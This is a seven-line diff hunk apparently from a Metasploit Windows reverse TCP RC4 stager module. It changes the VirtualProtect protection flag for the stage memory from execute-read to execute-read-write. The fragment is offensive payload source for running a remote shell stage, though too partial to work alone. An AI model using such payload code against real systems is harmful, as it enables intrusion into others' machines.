@@ -185,7 +185,7 @@ module Payload::Windows::ReverseTcpRc4
           ; push call params for VirtualProtect
           push 0               ; tmp var for holding old protect bits 
           push esp             ; push address of the tmp var
-          push 0x20            ; PAGE_EXECUTE_READ
+          push 0x40            ; PAGE_EXECUTE_READWRITE
           add ecx, 0x100       ; Add the size of scratch space
           push ecx             ; stage length
           sub ecx, 0x100
